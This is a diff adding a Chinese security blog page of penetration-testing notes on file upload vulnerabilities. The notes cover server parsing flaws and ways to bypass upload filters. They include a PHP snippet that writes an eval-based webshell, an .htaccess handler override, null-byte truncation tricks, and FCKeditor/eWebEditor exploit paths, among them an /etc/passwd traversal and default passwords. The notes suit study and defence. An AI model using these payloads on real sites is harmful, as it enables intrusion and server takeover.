@@ -1,0 +1,1152 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="文件上传,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="三种常见中间件的解析漏洞（IIS,apache,nginx）文件解析漏洞：一些特殊文件被iis,apache,nginx在某种情况下解释成脚本文件格式的漏洞。 1.IIS解析漏洞IIS常见版本6.0           一般windows server 20037.0/7.5        一般windows server 20088.0/8.5        一般windows server 2">
+<meta name="keywords" content="文件上传">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/08/11/文件上传漏洞/index.html">
+<meta property="og:site_name" content="Don&#39;t let your dreams be dreams">
+<meta property="og:description" content="三种常见中间件的解析漏洞（IIS,apache,nginx）文件解析漏洞：一些特殊文件被iis,apache,nginx在某种情况下解释成脚本文件格式的漏洞。 1.IIS解析漏洞IIS常见版本6.0           一般windows server 20037.0/7.5        一般windows server 20088.0/8.5        一般windows server 2">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-08-11T06:46:40.970Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="文件上传漏洞">
+<meta name="twitter:description" content="三种常见中间件的解析漏洞（IIS,apache,nginx）文件解析漏洞：一些特殊文件被iis,apache,nginx在某种情况下解释成脚本文件格式的漏洞。 1.IIS解析漏洞IIS常见版本6.0           一般windows server 20037.0/7.5        一般windows server 20088.0/8.5        一般windows server 2">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/11/文件上传漏洞/">
+
+
+
+
+
+  <title>文件上传漏洞 | Don't let your dreams be dreams</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Don't let your dreams be dreams</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/11/文件上传漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="RedYan">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/uploads/touxiang.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Don't let your dreams be dreams">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">文件上传漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-11T14:18:04+08:00">
+                2019-08-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="三种常见中间件的解析漏洞（IIS-apache-nginx）"><a href="#三种常见中间件的解析漏洞（IIS-apache-nginx）" class="headerlink" title="三种常见中间件的解析漏洞（IIS,apache,nginx）"></a>三种常见中间件的解析漏洞（IIS,apache,nginx）</h2><p>文件解析漏洞：一些特殊文件被iis,apache,nginx在某种情况下解释成脚本文件格式的漏洞。</p>
+<h3 id="1-IIS解析漏洞"><a href="#1-IIS解析漏洞" class="headerlink" title="1.IIS解析漏洞"></a>1.IIS解析漏洞</h3><h4 id="IIS常见版本"><a href="#IIS常见版本" class="headerlink" title="IIS常见版本"></a>IIS常见版本</h4><p>6.0           一般windows server 2003<br>7.0/7.5        一般windows server 2008<br>8.0/8.5        一般windows server 2012<br>10.0          一般windows server 2016</p>
+<h4 id="IIS5-X-6-0解析漏洞（两种利用方法）"><a href="#IIS5-X-6-0解析漏洞（两种利用方法）" class="headerlink" title="IIS5.X/6.0解析漏洞（两种利用方法）"></a>IIS5.X/6.0解析漏洞（两种利用方法）</h4><h5 id="1-目录解析-xx-asp-xx-jpg"><a href="#1-目录解析-xx-asp-xx-jpg" class="headerlink" title="1.目录解析 /xx.asp/xx.jpg"></a>1.目录解析 /xx.asp/xx.jpg</h5><p>在网站下建立文件夹名字为.asp .asa的文件夹，其目录内的任何扩展名的文件都被IIS当成asp文件来解析执行。<br>目录解析一般是配合编辑器进行使用，如ckfinder, fck</p>
+<h5 id="2-文件解析-ly-asp-jpg"><a href="#2-文件解析-ly-asp-jpg" class="headerlink" title="2.文件解析   ly.asp;.jpg"></a>2.文件解析   ly.asp;.jpg</h5><p>在IIS6.0下，服务器默认不解析分号后面的内容，因此该文件被当作asp文件解析。<br>IIS6.0下默认的可执行文件除了asp还包含asa,cer,cdx<br>Asa在IIS7.0，7.5也可以。Cer在7.0下有的可以有的不行。</p>
+<h4 id="IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞"></a>IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞</h4><p>在Fast-CGI开启状态下，可以上传一个例如ly.jpg，内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>的文件。然后访问ly.jpg/.php，在这个目录下就会生成一句话木马shell.php<br>注意：只要是IIS的支持PHP的都可以在图片后面加/.php看是否能运行。Iis7.5 /10.0都可能会被执行。这个漏洞准确的说不是中间件的漏洞，而是PHP的解析漏洞。</p>
+<h3 id="2-Apache解析漏洞"><a href="#2-Apache解析漏洞" class="headerlink" title="2.Apache解析漏洞"></a>2.Apache解析漏洞</h3><h4 id="x-php-zz-x-php"><a href="#x-php-zz-x-php" class="headerlink" title="x.php.zz  x.php."></a>x.php.zz  x.php.</h4><p>apache是从右往左开始判断解析，如果为不可识别解析，就再往左判断。比如x.php.zz，因为后缀是”.zz”不可被apache识别解析，所以会再往左解析，将该文件解析为x.php</p>
+<h4 id="htaccess文件解析漏洞"><a href="#htaccess文件解析漏洞" class="headerlink" title="htaccess文件解析漏洞"></a>htaccess文件解析漏洞</h4><p>如果在Apache中.htaccess可被执行，且可以被上传，那可以尝试在.htaccess中写入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch “x.jpx”&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>,然后再上传shell.jpx的木马，这样shell.jpx就可以解析为php文件。<br>注意：如果上面后缀名是jpg，那么网页所有的jpg图片都会被当作php解析，会导致原有图片出错。</p>
+<h3 id="3-Nginx解析漏洞"><a href="#3-Nginx解析漏洞" class="headerlink" title="3.Nginx解析漏洞"></a>3.Nginx解析漏洞</h3><p>(Nginx在高并发上性能优于Apache很多)</p>
+<h4 id="Nginx-lt-8-03空子节代码执行漏洞"><a href="#Nginx-lt-8-03空子节代码执行漏洞" class="headerlink" title="Nginx&lt;8.03空子节代码执行漏洞"></a>Nginx&lt;8.03空子节代码执行漏洞</h4><p>Nginx在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码。这种会很容易报错，但在burp抓包改包的时候可以这样写一下。Get方式提交自动截断，post方式提交手动截断，在抓包中把%00全选，ctr+shift+u手动截断。</p>
+<h4 id="IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞-1"><a href="#IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞-1" class="headerlink" title="IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞"></a>IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞</h4><p>在Fast-CGI开启状态下，可以上传一个例如ly.jpg，内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>的文件。然后访问ly.jpg/.php，在这个目录下就会生成一句话木马shell.php</p>
+<h2 id="文件上传绕过技巧"><a href="#文件上传绕过技巧" class="headerlink" title="文件上传绕过技巧"></a>文件上传绕过技巧</h2><h3 id="服务器命名规则"><a href="#服务器命名规则" class="headerlink" title="服务器命名规则"></a>服务器命名规则</h3><h4 id="第一种类型：上传文件名和服务器命名一致"><a href="#第一种类型：上传文件名和服务器命名一致" class="headerlink" title="第一种类型：上传文件名和服务器命名一致"></a>第一种类型：上传文件名和服务器命名一致</h4><h4 id="第二种类型：上传文件名和服务器命名不一致（随机，时间日期命名等）"><a href="#第二种类型：上传文件名和服务器命名不一致（随机，时间日期命名等）" class="headerlink" title="第二种类型：上传文件名和服务器命名不一致（随机，时间日期命名等）"></a>第二种类型：上传文件名和服务器命名不一致（随机，时间日期命名等）</h4><h3 id="常见的上传检测方式"><a href="#常见的上传检测方式" class="headerlink" title="常见的上传检测方式"></a>常见的上传检测方式</h3><h4 id="1-客户端javascript检测（通常为检测文件扩展名）"><a href="#1-客户端javascript检测（通常为检测文件扩展名）" class="headerlink" title="1.客户端javascript检测（通常为检测文件扩展名）"></a>1.客户端javascript检测（通常为检测文件扩展名）</h4><h5 id="一、首先判断是否为JS本地验证"><a href="#一、首先判断是否为JS本地验证" class="headerlink" title="一、首先判断是否为JS本地验证"></a>一、首先判断是否为JS本地验证</h5><p>如果浏览器页面没有刷新或者打开burp抓包没有抓到包就已经有验证结果即可证明为前端JS本地验证。</p>
+<h5 id="二、绕过方法"><a href="#二、绕过方法" class="headerlink" title="二、绕过方法"></a>二、绕过方法</h5><h6 id="1-先上传符合要求的文件名如xx-jpg-再用burp抓包改包改成xx-php"><a href="#1-先上传符合要求的文件名如xx-jpg-再用burp抓包改包改成xx-php" class="headerlink" title="(1).先上传符合要求的文件名如xx.jpg,再用burp抓包改包改成xx.php"></a>(1).先上传符合要求的文件名如xx.jpg,再用burp抓包改包改成xx.php</h6><h6 id="2-使用firebug等直接删除掉本地验证的JS代码，如删除点提交点击事件触发的验证函数代码。"><a href="#2-使用firebug等直接删除掉本地验证的JS代码，如删除点提交点击事件触发的验证函数代码。" class="headerlink" title="(2).使用firebug等直接删除掉本地验证的JS代码，如删除点提交点击事件触发的验证函数代码。"></a>(2).使用firebug等直接删除掉本地验证的JS代码，如删除点提交点击事件触发的验证函数代码。</h6><h6 id="3-将PHP等需要用到的后缀名添加到JS验证的白名单中"><a href="#3-将PHP等需要用到的后缀名添加到JS验证的白名单中" class="headerlink" title="(3).将PHP等需要用到的后缀名添加到JS验证的白名单中"></a>(3).将PHP等需要用到的后缀名添加到JS验证的白名单中</h6><h4 id="2-服务端MIME类型检测（检测Content-Type内容）"><a href="#2-服务端MIME类型检测（检测Content-Type内容）" class="headerlink" title="2.服务端MIME类型检测（检测Content-Type内容）"></a>2.服务端MIME类型检测（检测Content-Type内容）</h4><h5 id="一、MIME的作用和定义目录："><a href="#一、MIME的作用和定义目录：" class="headerlink" title="一、MIME的作用和定义目录："></a>一、MIME的作用和定义目录：</h5><p>使客户端软件，区分不同种类的数据，例如WEB浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。<br>WEB服务器使用MIME来说明发送数据的种类，WEB客户端使用MIME来说明希望接收到的数据种类。<br>Tomcat的安装目录\conf\web.xml中定义了大量的MIME类型。<br>Apache的安装目录\conf\mime.types中定义了大量的MIME类型，httpd.conf中也定义了一些特殊的MIME类型。</p>
+<h5 id="二、绕过方法："><a href="#二、绕过方法：" class="headerlink" title="二、绕过方法："></a>二、绕过方法：</h5><p>例：burp抓包后修改Content-Type:image/gif</p>
+<h4 id="3-服务端目录路径检测（检测跟path参数相关的内容）"><a href="#3-服务端目录路径检测（检测跟path参数相关的内容）" class="headerlink" title="3.服务端目录路径检测（检测跟path参数相关的内容）"></a>3.服务端目录路径检测（检测跟path参数相关的内容）</h4><p>目录路径检测，一般就检测路径是否合法。<br>补充：韩国很多的网站对脚本没有做限制，不改名，也不限制类型，但是规定好了上传目录的权限，如只有读权限没有执行权限。如果上传的文件没有被改名，可以在文件名前面加../的方式跳出指定目录。往往上一层目录就有执行权限了。<br>Filepath路径修改绕过(burp抓包后发到repeater中修改)<br>可以用来突破自动命名规则xxxxx.gif<br>一、改变文件上传后的路径<br>/a.asp/  需要一定的创建权限，成功城建后为/a.asp/xxxxx.gif<br>二、直接改变文件名称<br>/a.asp;.  修改后为/a.asp;.xxxxx.gif</p>
+<h4 id="4-服务端文件扩展名检测（检测跟文件extension相关的内容）"><a href="#4-服务端文件扩展名检测（检测跟文件extension相关的内容）" class="headerlink" title="4.服务端文件扩展名检测（检测跟文件extension相关的内容）"></a>4.服务端文件扩展名检测（检测跟文件extension相关的内容）</h4><h5 id="黑名单检测——安全性比白名单低很多，攻击手法也比白名单多。"><a href="#黑名单检测——安全性比白名单低很多，攻击手法也比白名单多。" class="headerlink" title="黑名单检测——安全性比白名单低很多，攻击手法也比白名单多。"></a>黑名单检测——安全性比白名单低很多，攻击手法也比白名单多。</h5><p>绕过方式：<br>（1）文件名大小写绕过<br>例如AsP,pHp<br>（2）名单列表绕过<br>用名单列表里没有的名单进行攻击，比如黑名单里没有asa或cer之类。<br>也可以把安全狗不允许的上传后缀名单复制到txt文件中，用burp爆破就可以知道哪些后缀可以被上传。<br>（3）特殊文件名绕过<br>比如发送的http包里把文件名改成test.asp.或test.asp_(下划线为空格)，这种命名方式在windows系统里是不被允许的，所以需要在burp进行修改，然后绕过验证后，会被windows系统自动去掉后面的.和空格，但要注意unix/linux系统没有这个特性。<br>（4）0x00截断绕过<br>目前只遇到过asp的程序有这种漏洞，给个简单的伪代码name=getname(http request)//假如这时候获取到的文件名是test.asp .jpg(asp后面为0x00) ,type=gettype(name)//而在gettype()函数里处理方式是从后往前扫描扩展名，所以判断为jpg,   if(type==jpg)<br>(5)   .htaccess文件攻击配合名单列表绕过。上传一个自定义的.htaccess<br>(6)   解析调用/漏洞绕过<br>这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p>
+<h5 id="白名单检测——相对难过很多，但是也不一定绝对安全。"><a href="#白名单检测——相对难过很多，但是也不一定绝对安全。" class="headerlink" title="白名单检测——相对难过很多，但是也不一定绝对安全。"></a>白名单检测——相对难过很多，但是也不一定绝对安全。</h5><p>绕过方式：<br>（1）0x00截断绕过<br>用像test.asp%00.jpg的方式进行截断，属于白名单文件，再利用服务端代码的检测逻辑漏洞进行攻击。</p>
+<p>00截断<br>0x00，%00，/00之类的截断，都是一样的，只是不同表示而已<br>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束<br>0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制<br>在需要截断的位置添加了一个空格，空格是为了占位，方便修改00。然后打开hex,（空格的16进制为0x20）修改16进制内容，把20改成00即可。</p>
+<p>（2）解析调用/漏洞绕过 这类漏洞直接配合上传一个代码注入过的白名单文件即可，再利用解析调用/漏洞<br>.htaccess文件攻击，通过一个.htaccess文件调用php的解析器去解析一个文件名中只要包含“haha”这个字符串的任意文件，所以无论文件名是什么样子，只要包含“haha”这个字符串，都可以被以php的方式来解析。建一个.htaccess文件，里面的内容如下&lt;FilesMatch “haha”&gt;<br>SetHandler application/x-httpd-php</p>
+<p>双文件上传  （老的asp的站如南方，良精，动易……都可能存在双文件上传）</p>
+<h4 id="5-服务端文件内容检测（检测内容是否合法或含有恶意代码）"><a href="#5-服务端文件内容检测（检测内容是否合法或含有恶意代码）" class="headerlink" title="5.服务端文件内容检测（检测内容是否合法或含有恶意代码）"></a>5.服务端文件内容检测（检测内容是否合法或含有恶意代码）</h4><p>如果文件内容检测设置的比较严格，那么上传攻击将变得非常困难，也可以说它是再代码层检测的最后一道关卡，如果它被突破了，就算没有代码层的漏洞，也给后面利用应用层的解析漏洞带来了机会。<br>一般用图片马，有waf要求一句话代码能过waf。<br>绕过二次渲染：<br>1.攻击函数本身，通过上传不完整图片让其渲染函数暴露，然后攻击之。<br>2.对文件加载器进行溢出攻击。<br>怎么看是否被二次渲染：上传一张图片马 ，下载到本地，打开看看如果代码还在就没有被二次渲染。</p>
+<h2 id="常见编辑器漏洞"><a href="#常见编辑器漏洞" class="headerlink" title="常见编辑器漏洞"></a>常见编辑器漏洞</h2><p>动态的网站后台基本都是有编辑器的，主要利用编辑器的上传按钮辅助拿shell。编辑器因为有一个技术团队维护，所以安全性比很多网站自带的上传按钮高很多，主要是配合解析漏洞来突破。<br>总体流程：先找编辑器后台或目录，确定编辑器种类和版本，然后百度找对应版本的漏洞利用，一般是配合解析漏洞。</p>
+<h3 id="编辑器利用"><a href="#编辑器利用" class="headerlink" title="编辑器利用"></a>编辑器利用</h3><h4 id="1-查找编辑器目录"><a href="#1-查找编辑器目录" class="headerlink" title="1.查找编辑器目录"></a>1.查找编辑器目录</h4><h5 id="（1）目录扫描"><a href="#（1）目录扫描" class="headerlink" title="（1）目录扫描"></a>（1）目录扫描</h5><p>注意目录的递归扫描<br>一些重点目录：<br>editor<br>edit<br>fckeditor<br>ewebeditor<br>admin/editor<br>upload.asp<br>upfile.asp<br>up.html</p>
+<h5 id="（2）目录遍历"><a href="#（2）目录遍历" class="headerlink" title="（2）目录遍历"></a>（2）目录遍历</h5><p>Awvs<br>Caidao<br>Burpsuite</p>
+<h5 id="（3）蜘蛛爬行"><a href="#（3）蜘蛛爬行" class="headerlink" title="（3）蜘蛛爬行"></a>（3）蜘蛛爬行</h5><p>爬行可以很容易的爬到图片上传等目录，然后可以通过图片上传目录的路径判断编辑器类型。<br>Ewebeditor通常上传图片目录：<br>Uploadfiles/2019092512321313131.jpg    (以时间戳命名)</p>
+<p>Fck通常上传图片目录<br>Userfile/images/x.jpg</p>
+<h5 id="（4）谷歌语法"><a href="#（4）谷歌语法" class="headerlink" title="（4）谷歌语法"></a>（4）谷歌语法</h5><p>site: xxx.com inurl:editor<br>inurl:fckeditor<br>inurl:ewebeditor</p>
+<h4 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h4><p>百度相关编辑器漏洞利用</p>
+<h3 id="FCKeditor编辑器利用"><a href="#FCKeditor编辑器利用" class="headerlink" title="FCKeditor编辑器利用"></a>FCKeditor编辑器利用</h3><p>FCKeditor编辑器页面：<br>FCKeditor/_samples/default.html<br>查看文件上传路径：<br>fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/<br>查看FCK版本：<br>FCKeditor/_whatsnew.html<br>查看FCK版本：<br>/editor/dialog/fck_about.html<br>爆物理路径php:<br>/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php<br>爆绝对路径aspx<br>/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/aspx/connector.aspx<br>爆路径：<br>http:///editor/filemanager/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/<br>JSP上传1<br>/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connector<br>JSP上传2<br>/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jsp<br>目录浏览1<br>/editor/filemanager/browser/default/browser.html?Type=File&amp;Connector=../../connectors/asp/connector.asp<br>目录浏览2<br>/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp<br>目录浏览3<br>/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F<br>Asp创文件夹1<br>/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/qing.asp&amp;NewFolderName=x.asp<br>Asp创文件夹2<br>/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=%2Fshell.asp&amp;NewFolderName=z&amp;uuid=1244789975684<br>Asp创文件夹3<br>/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=shell.asp”<br>上传页面1<br>/editor/filemanager/browser/default/connectors/test.html<br>上传页面2<br>/editor/filemanager/upload/test.html<br>上传页面3<br>/editor/filemanager/connectors/test.html<br>上传页面4<br>/editor/filemanager/connectors/uploadtest.html<br>目录浏览3<br>/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%2F<br>Joomla fck包含<br>/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../../../../etc/passwd<br>上传地址3：<br>editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp</p>
+<p>Fck2.4.3如果是iis6.0可以利用编辑器的创建文件夹功能创建一个x.asp目录，然后在该目录下上传图片马，利用目录解析漏洞。也可以上传x.asp;.jpg，利用文件名解析漏洞。如果没有解析漏洞可以上传x.jpg，然后用burp抓包，在.后面加asp%00,然后%00截断。也可以配合之前学习的其他突破方式突破，如前端js,mime等。</p>
+<p>Fck2.5遇到点变下划线，先创建x.asp,然后抓包，把第一行当前文件目录修改由根%2F变为%2Fxx.asp,这样只会把文件x.asp点变下划线，文件夹名字被保留。然后再利用解析漏洞上传图片马。        也可以利用二次上次，上传一个文件两次，因为文件名相同，可能会在后面加（1），有的时候代码不严谨，重名后代码没有再把点变下划线，不过这种能成功地概率很低。</p>
+<p>Fck2.6高版本的，上传正常图片，抓包，在currentfolder=%2F加a,php%00，上传的时候%00会被自动截断，原来会把文件名放到%2F后面，现在会放到%00后面，然后被自动截断。遇到高版本的可以测试下，有的时候可以成功。</p>
+<h3 id="EWEBeditor编辑器利用"><a href="#EWEBeditor编辑器利用" class="headerlink" title="EWEBeditor编辑器利用"></a>EWEBeditor编辑器利用</h3><p>ewebeditor/admin_style.asp<br>ewebeditor有独立登陆后台，因为登陆页面可能会被修改，可以登陆登陆后的页面样式页面，就会跳转到登陆页面。</p>
+<p>ewebeditor/admin/login.asp</p>
+<p>1.进后台<br>弱口令：admin admin/   admin 123456/    admin123 admin888……<br>下载默认数据库:ewebeditor/db/ewebeditor.mdb或ewebeditor/db/%23ewebeditor.mdb<br>Burp抓包爆破<br>利用注入点进行注入得到密码</p>
+<p>2.修改上传类型/自己添加上传样式-添加上传按钮-上传<br>在后台修改上传样式如果加入asp需要写aaspsp的形式，因为程序有代码把asp替换为空。通常可以加cer等。修改样式没有提交按钮，可以在页面hmtl编辑中自己手动添加一个提交按钮。也可以新建一个样式。</p>
+<p>如果没有后台：<br>（1）利用目录遍历漏洞，找网站数据库位置下载数据库，登陆网站后台拿shell<br>（2）利用exp进行拿shell<br>（3）构造上传<br>    下载ewebeditor数据库，找到ewebeditor_style表，看看有没有可以上传脚本类型的样式，记住对应id，在网站随便找一个上传点，把id替换就可以上传了</p>
+<h3 id="其他类型编辑器的利用"><a href="#其他类型编辑器的利用" class="headerlink" title="其他类型编辑器的利用"></a>其他类型编辑器的利用</h3><h4 id="（1）ckfinder编辑器"><a href="#（1）ckfinder编辑器" class="headerlink" title="（1）ckfinder编辑器"></a>（1）ckfinder编辑器</h4><p>如果是iis6.0,找到编辑器目录，创建.asp子文件夹，用目录解析漏洞上传</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>Just as you like</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wxfkm.png" alt="RedYan 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/文件上传/" rel="tag"># 文件上传</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/09/文件包含及漏洞利用/" rel="next" title="文件包含及漏洞利用">
